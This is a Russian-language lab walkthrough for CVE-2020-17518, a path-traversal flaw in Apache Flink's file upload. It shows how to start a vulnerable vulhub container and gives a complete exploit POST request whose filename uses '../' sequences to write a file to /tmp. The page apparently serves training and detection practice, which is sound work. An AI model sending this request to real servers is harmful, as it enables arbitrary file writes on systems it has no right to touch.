# CVE-2020-17518

### Материалы:

{% embed url="https://nvd.nist.gov/vuln/detail/CVE-2020-17518" %}

{% embed url="https://www.opencve.io/cve/CVE-2020-17518" %}

{% embed url="https://www.programmersought.com/article/236511184567/" %}

Apache Flink - это фреймворк для обработки потоков с открытым исходным кодом, обладающий мощными возможностями потоковой и пакетной обработки.

В Apache Flink 1.5.1 появился REST-обработчик, позволяющий записать загруженный файл в произвольное место локальной файловой системы через злонамеренно измененный HTTP HEADER.

### Эксплуатация уязвимости

> Контейнер с уязвимой средой находится в директории /home/user/Hackathon/vulhub-master/flink/CVE-2020-17518

Для запуска узявимой среды выполните команду

```
docker compose up -d
```

После запуска по адресу http://ваш-ip:8081 будет доступна домашняя страница Apache Flink

\---- скрин web ----

Для эсплуатации уязвимости отправьте соответствующий POST-запрос:

```
POST /jars/upload HTTP/1.1
Host: ваш-ip:8081
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y
Content-Length: 187

------WebKitFormBoundaryoZ8meKnrrso89R6Y
Content-Disposition: form-data; name="jarfile"; filename="../../../../../../tmp/success"

success
------WebKitFormBoundaryoZ8meKnrrso89R6Y--

```

\---- скрин отправки запроса в burp ----

После его отправки будет на машине будет создан файл /tmp/success

\---- скрин создания файла ----

вазух&#x20;

\---- скрин вазух ----
